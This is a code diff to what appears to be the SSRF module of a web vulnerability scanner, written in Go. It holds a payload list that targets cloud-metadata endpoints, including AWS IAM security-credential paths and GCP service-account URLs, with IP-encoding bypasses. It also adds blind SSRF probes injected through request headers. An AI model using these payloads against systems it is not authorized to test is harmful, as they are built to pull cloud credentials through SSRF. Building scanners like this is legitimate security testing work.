@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"net/url"
 	"regexp"
 	"strings"
 	"sync"
@@ -55,6 +54,9 @@ var ssrfMetadataSignatures = []*regexp.Regexp{
 	regexp.MustCompile(`(?i)instance-action`),
 	regexp.MustCompile(`(?i)"ManagedPolicyArns"`),
 	regexp.MustCompile(`(?i)ssh-public-keys`),
+	// GCP service-account metadata (requires Metadata-Flavor on many routes).
+	regexp.MustCompile(`(?i)"email"\s*:\s*"[^"]+\.gserviceaccount\.com"`),
+	regexp.MustCompile(`(?i)"serviceAccounts"\s*:\s*{`),
 	// Azure IMDS (http://169.254.169.254/metadata/instance)
 	regexp.MustCompile(`(?i)"azEnvironment"\s*:`),
 	regexp.MustCompile(`(?i)"subscriptionId"\s*:`),
@@ -81,12 +83,7 @@ var ssrfPayloadHostMarkers = []string{
 	"0251.0376.0251.0376",
 	"0xa9fea9fe",
 	"metadata.google.internal",
-	"meta-data",
-	"security-credentials",
-	"computeMetadata",
 	"100.100.100.200",
-	"metadata/instance",
-	"opc/v2/instance",
 }
 
 // responseReflectsPayload reports whether the response merely echoed our SSRF
@@ -109,6 +106,20 @@ func responseReflectsPayload(body, payloadURL string) bool {
 
 const ssrfMaxParams = 150
 
+var ssrfInbandPayloads = []struct{ url, note string }{
+	{"http://169.254.169.254/latest/meta-data/", "AWS IMDS"},
+	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"},
+	{"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true", "GCP service-account metadata"},
+	{"http://2852039166/latest/meta-data/", "AWS IMDS (decimal IP)"},
+	{"http://[::ffff:169.254.169.254]/latest/meta-data/", "AWS IMDS (IPv4-mapped IPv6)"},
+	{"http://0xa9fea9fe/latest/meta-data/", "AWS IMDS (hex IP)"},
+	{"http://0251.0376.0251.0376/latest/meta-data/", "AWS IMDS (octal IP)"},
+	{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"},
+	{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"},
+	{"http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"},
+	{"http://169.254.169.254/opc/v2/instance/", "Oracle Cloud metadata"},
+}
+
 // Run tests SSRF-prone parameters by pointing them at cloud-metadata endpoints
 // and internal hosts, then confirming via metadata signatures in the response.
 // Targeted + bounded so it stays fast even on big scopes.
@@ -117,28 +128,13 @@ func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 
 	candidates := s.selectCandidates(ctx, targetID)
 	logFn("info", "ssrf", fmt.Sprintf("Selected %d SSRF-prone parameters", len(candidates)))
+	auth := loadAuthHeaders(ctx, s.db, targetID)
 	if len(candidates) == 0 {
 		// No in-band candidates, but blind (out-of-band) SSRF may still be planted
 		// on URL-prone params whose fetch produces no visible response signal.
 		s.plantBlindSSRF(ctx, targetID, logFn)
+		s.plantBlindSSRFHeaders(ctx, targetID, auth, logFn)
 		return nil
-	}
-
-	// Metadata + internal payloads across every major cloud provider, plus
-	// IP-encoding bypasses (decimal/hex/octal/IPv6) for the shared 169.254.169.254
-	// link-local address that AWS/Azure/DigitalOcean/Oracle all use.
-	payloads := []struct{ url, note string }{
-		{"http://169.254.169.254/latest/meta-data/", "AWS IMDS"},
-		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"},
-		{"http://metadata.google.internal/computeMetadata/v1/instance/", "GCP metadata"},
-		{"http://2852039166/latest/meta-data/", "AWS IMDS (decimal-IP bypass)"},
-		{"http://[::ffff:169.254.169.254]/latest/meta-data/", "AWS IMDS (IPv6 bypass)"},
-		{"http://0xa9fea9fe/latest/meta-data/", "AWS IMDS (hex-IP bypass)"},
-		{"http://0251.0376.0251.0376/latest/meta-data/", "AWS IMDS (octal-IP bypass)"},
-		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"},
-		{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"},
-		{"http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"},
-		{"http://169.254.169.254/opc/v2/instance/", "Oracle Cloud (OCI) metadata"},
 	}
 
 	sem := make(chan struct{}, 8)
@@ -151,7 +147,7 @@ func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 		}
 		wg.Add(1)
 		sem <- struct{}{}
-		go func(rawURL, param string) {
+		go func(ip insertionPoint) {
 			defer wg.Done()
 			defer func() { <-sem }()
 
@@ -159,11 +155,18 @@ func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 			// already appears here is NOT from our injection — skip it. This
 			// kills false positives from APIs whose normal JSON happens to
 			// contain a metadata-like token.
-			baseline := s.fetch(ctx, injectParam(rawURL, param, "recon-baseline-x"), "")
+			control := "https://" + newXSSToken("rcnssrf") + ".invalid/"
+			baseline, baselineStatus := s.fetch(ctx, ip, control, auth)
+			if looksLikeBlockPage(baselineStatus, baseline) {
+				return
+			}
 
-			for _, pl := range payloads {
-				body := s.fetch(ctx, injectParam(rawURL, param, pl.url), pl.url)
+			for _, pl := range ssrfInbandPayloads {
+				body, status := s.fetch(ctx, ip, pl.url, auth)
 				if body == "" {
+					continue
+				}
+				if looksLikeBlockPage(status, body) {
 					continue
 				}
 				// FALSE-POSITIVE GUARD: if the endpoint just echoed our payload URL
@@ -176,20 +179,24 @@ func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 				for _, sig := range ssrfMetadataSignatures {
 					if sig.MatchString(body) && !sig.MatchString(baseline) {
 						// Confirm once more to rule out a transient/dynamic body.
-						body2 := s.fetch(ctx, injectParam(rawURL, param, pl.url), pl.url)
-						if responseReflectsPayload(body2, pl.url) || !sig.MatchString(body2) {
+						body2, status2 := s.fetch(ctx, ip, pl.url, auth)
+						control2, controlStatus := s.fetch(ctx, ip, "https://"+newXSSToken("rcnssrf")+".invalid/", auth)
+						if looksLikeBlockPage(status2, body2) || looksLikeBlockPage(controlStatus, control2) ||
+							responseReflectsPayload(body2, pl.url) || !sig.MatchString(body2) || sig.MatchString(control2) {
 							continue
 						}
-						ev := fmt.Sprintf("Cloud-metadata response content (%s) returned via %s, absent from baseline and not a reflection of the payload URL — confirmed twice", sig.String(), pl.note)
-						s.storeConf(targetID, "ssrf", "critical", rawURL, param, pl.url, ev, ConfPoC)
+						ev := fmt.Sprintf("Cloud-metadata response content (%s) returned via %s, absent from two controls and not payload reflection; reproduced twice [HTTP %d/%d, %s %s]",
+							sig.String(), pl.note, status, status2, strings.ToUpper(ip.Method), insertionLocation(ip))
+						s.storeConf(targetID, ip, pl.url, pl.note, ev, ConfPoC)
 						found.Add(1)
-						logFn("warn", "ssrf", fmt.Sprintf("SSRF CONFIRMED: %s param=%s → %s", rawURL, param, pl.note))
-						s.notify(targetID, rawURL, param)
+						logFn("warn", "ssrf", fmt.Sprintf("SSRF CONFIRMED: %s param=%s [%s/%s] → %s",
+							ip.URL, ip.Param, ip.Method, insertionLocation(ip), pl.note))
+						s.notify(targetID, ip.URL, ip.Param)
 						return
 					}
 				}
 			}
-		}(c.url, c.param)
+		}(c)
 	}
 	wg.Wait()
 
@@ -197,6 +204,7 @@ func (s *SSRFScanner) Run(ctx context.Context, targetID string, logFn LogFunc) e
 	// the shared OOB capability, so a single-objective SSRF scan gets full coverage
 	// without pulling in a multi-class OAST module.
 	s.plantBlindSSRF(ctx, targetID, logFn)
+	s.plantBlindSSRFHeaders(ctx, targetID, auth, logFn)
 
 	logFn("info", "ssrf", fmt.Sprintf("SSRF check done. Found %d.", found.Load()))
 	return nil
@@ -211,93 +219,144 @@ func (s *SSRFScanner) plantBlindSSRF(ctx context.Context, targetID string, logFn
 	if !ok {
 		return
 	}
-	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
+	points := s.selectCandidates(ctx, targetID)
 	if len(points) == 0 {
 		return
 	}
 	auth := loadAuthHeaders(ctx, s.db, targetID)
 	n := o.plantClass(ctx, s.db, targetID, points, auth, "ssrf",
-		func(ip insertionPoint) bool { return paramProneTo(ClassSSRF, ip.Param, "") },
-		func(cb string) []string { return ssrfOOBPayloads(cb, o.callbackHost) })
+		nil,
+		func(ip insertionPoint, cb string) []string { return ssrfOOBPayloads(cb, o.callbackHost, ip.Value) })
 	if n > 0 {
 		logFn("info", "ssrf", fmt.Sprintf("Planted %d blind-SSRF OOB probe(s); execution reported via callback.", n))
 	}
 }
 
-type ssrfCandidate struct{ url, param string }
+// plantBlindSSRFHeaders covers hidden URL sinks that are not represented in the
+// parameters table. Referer-based fetches are a documented blind-SSRF surface;
+// proxy/routing headers are included because real applications pass them into
+// preview, audit and callback services. Each header gets its own token/request so
+// a callback identifies the exact sink rather than merely the host.
+func (s *SSRFScanner) plantBlindSSRFHeaders(ctx context.Context, targetID string, auth map[string]string, logFn LogFunc) {
+	o, ok := newOOBCapability(s.cfg)
+	if !ok {
+		return
+	}
+	roots := (&OASTScanner{db: s.db}).aliveRoots(ctx, targetID)
+	if len(roots) == 0 {
+		return
+	}
+	headers := []struct {
+		name     string
+		hostOnly bool
+		wrap     func(string) string
+	}{
+		{name: "Referer"},
+		{name: "X-Forwarded-Host", hostOnly: true},
+		{name: "X-Forwarded-For", hostOnly: true},
+		{name: "X-Original-URL"},
+		{name: "X-Rewrite-URL"},
+		{name: "Forwarded", hostOnly: true, wrap: func(v string) string { return `host="` + v + `"` }},
+	}
+	sem := make(chan struct{}, 10)
+	var wg sync.WaitGroup
+	planted := 0
+	for _, root := range roots {
+		for _, h := range headers {
+			if ctx.Err() != nil {
+				break
+			}
+			token := registerOOBProbe(s.db, targetID, root, h.name, "ssrf", "header:"+h.name)
+			cb := o.callbackURL(token)
+			value := cb
+			if h.hostOnly {
+				value = o.callbackHost
+			}
+			if h.wrap != nil {
+				value = h.wrap(value)
+			}
+			planted++
+			wg.Add(1)
+			sem <- struct{}{}
+			go func(root, header, value string) {
+				defer wg.Done()
+				defer func() { <-sem }()
+				reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+				defer cancel()
+				req, err := http.NewRequestWithContext(reqCtx, http.MethodGet, root, nil)
+				if err != nil {
+					return
+				}
+				req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; ReconBot/1.0)")
+				for k, v := range auth {
+					req.Header.Set(k, v)
+				}
+				req.Header.Set(header, value)
+				if resp, err := oastClient.Do(req); err == nil {
+					resp.Body.Close()
+				}
+			}(root, h.name, value)
+		}
+	}
+	wg.Wait()
+	if planted > 0 {
+		logFn("info", "ssrf", fmt.Sprintf("Planted %d header-specific blind-SSRF probe(s) across %d live roots.", planted, len(roots)))
+	}
+}
 
-func (s *SSRFScanner) selectCandidates(ctx context.Context, targetID string) []ssrfCandidate {
-	rows, err := s.db.QueryContext(ctx, `SELECT DISTINCT url, parameter, COALESCE(value,'') FROM parameters WHERE target_id = ?`, targetID)
-	if err != nil {
-		return nil
+func (s *SSRFScanner) selectCandidates(ctx context.Context, targetID string) []insertionPoint {
+	limit := ssrfMaxParams
+	if s.cfg != nil {
+		limit = s.cfg.URLLimit()
 	}
-	defer rows.Close()
-	seen := make(map[string]bool)
-	var out []ssrfCandidate
-	for rows.Next() {
-		var u, param, val string
-		if err := rows.Scan(&u, &param, &val); err != nil {
-			continue
-		}
-		// Route via the unified param classifier: name tokens (redirect_url,
-		// returnUrl, image_url…) + value heuristic (a value that IS a URL).
-		if !paramProneTo(ClassSSRF, param, val) {
-			continue
-		}
-		parsed, err := url.Parse(u)
-		if err != nil {
-			continue
-		}
-		key := parsed.Host + parsed.Path + "?" + param
-		if seen[key] {
-			continue
-		}
-		seen[key] = true
-		out = append(out, ssrfCandidate{u, param})
-		if len(out) >= ssrfMaxParams {
-			break
-		}
-	}
-	return out
+	return loadRoutedInsertionPoints(ctx, s.db, targetID, ClassSSRF, limit, 32)
 }
 
 // fetch sends the request. For GCP metadata the Metadata-Flavor header is
 // required, so we set it whenever the payload targets metadata.google.internal.
-func (s *SSRFScanner) fetch(ctx context.Context, u, payload string) string {
+func (s *SSRFScanner) fetch(ctx context.Context, ip insertionPoint, payload string, auth map[string]string) (string, int) {
 	reqCtx, cancel := context.WithTimeout(ctx, 12*time.Second)
 	defer cancel()
-	req, err := http.NewRequestWithContext(reqCtx, "GET", u, nil)
+	req, err := buildInjectedRequest(reqCtx, ip, payload, auth)
 	if err != nil {
-		return ""
+		return "", 0
 	}
-	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
 	if strings.Contains(payload, "metadata.google.internal") {
 		req.Header.Set("Metadata-Flavor", "Google")
 	}
 	if strings.Contains(payload, "/metadata/instance") {
 		req.Header.Set("Metadata", "true") // Azure IMDS requires this exact header
 	}
-	if strings.Contains(payload, "/opc/v2/instance") {
-		req.Header.Set("Authorization", "Bearer Oracle") // OCI IMDS v2 requires this exact header
+	// OCI IMDSv2 expects Authorization on the server-side metadata request. Do
+	// not set it on this outer request: that would overwrite the target's real
+	// bearer token and turn every authenticated OCI probe into a false negative.
+	host := hostOfURL(ip.URL)
+	release, acquired := hostRequestAcquire(reqCtx, host)
+	if !acquired {
+		return "", 0
 	}
+	defer release()
+	hostThrottleWait(reqCtx, host)
 	resp, err := ssrfHTTPClient.Do(req)
 	if err != nil {
-		return ""
+		hostThrottleObserve(host, 0, true)
+		return "", 0
 	}
 	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
 	resp.Body.Close()
-	return string(body)
+	hostThrottleObserve(host, resp.StatusCode, false)
+	return string(body), resp.StatusCode
 }
 
-func (s *SSRFScanner) storeConf(targetID, vulnType, severity, rawURL, param, payload, evidence string, confidence int) {
+func (s *SSRFScanner) storeConf(targetID string, ip insertionPoint, payload, subtype, evidence string, confidence int) {
 	verdict := VerifyVerified
 	if confidence < ConfEvidence {
 		verdict = CandDetected
 	}
 	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
-		TargetID: targetID, Type: vulnType, Severity: severity, URL: rawURL, Method: "GET",
-		Parameter: param, Location: "query", Payload: payload, Evidence: evidence,
-		Source: "ssrf-native", DetectionMethod: "response-signature", Confidence: confidence,
+		TargetID: targetID, Type: "ssrf", Subtype: subtype, Severity: "critical", URL: ip.URL, Method: ip.Method,
+		Parameter: ip.Param, Location: insertionLocation(ip), Payload: payload, Evidence: evidence,
+		Source: "ssrf-native", DetectionMethod: "differential-response-signature-replay", Confidence: confidence,
 		Verdict: verdict,
 	})
 }
